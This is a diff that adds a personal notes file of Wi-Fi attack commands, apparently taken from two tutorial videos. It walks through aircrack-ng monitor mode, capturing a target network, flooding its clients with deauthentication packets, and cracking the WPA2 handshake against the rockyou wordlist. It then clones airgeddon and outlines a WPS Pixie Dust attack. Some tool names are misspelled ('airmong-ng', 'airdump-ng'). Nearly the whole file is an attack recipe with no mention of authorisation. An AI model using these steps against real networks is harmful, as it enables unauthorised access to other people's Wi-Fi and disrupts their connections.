@@ -1,0 +1,56 @@
+1.Wi-Fi Attack
+######    AIRCRACK   ####
+source:https://youtu.be/WfYxrLaqlN8?si=ju72y7sqGl1x1sGZ
+
+COMMANDS
+iwconfig
+cat /etc/os-release
+uname -a
+sudo airmong-ng check kill
+sudo airmong-ng start wlan0
+sudo airmong-ng  --> wlan0mon
+sudo airodump-ng wlan0mon -->  name and BSSID channels
+@Use airodump-ng to view only one network
+sudo airdump-ng wlan0mon -d bssid
+@Connect to network using an iPhone
+sudo airodump-ng -w hack1 -c 2 --bssid bssid wlan0mon
+
+@Use aireplay-ng to deauthenticate clients
+sudo aireplay-ng  --deauth 0 -a bssid wlan0mon
+
+@WPA2 four way handshake captured
+@Use Wireshark to view WPA2 four way handshake
+wireshark hack1.cap
+@search eapol
+@Put interface back into managed mode
+sudo airmong-ng stop wlan0mon
+
+@Crack WPA2 password with aircrack-ng
+aircrack-ng hack1.cap -w /usr/share/wordlists/rockyou.txt
+@Password cracked
+
+
+
+
+
+
+
+
+
+
+
+##########        AIRGEDDON       ##############
+source:https://youtu.be/SY0WMHTCCOM?si=GJ3iZDjJE8WRi0gH
+Command:
+apt-get update  #Update
+git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git  #Clone Tools
+./airgeddon.sh    #bash airgeddon.sh
+
+-select wlan1
+-put interfacein monitor mode
+-WPS attacks menu
+-explore for targets(monitor mode needed)
+
+-select target wifi 
+-(bully) Pixiw Dust attack
+(55)
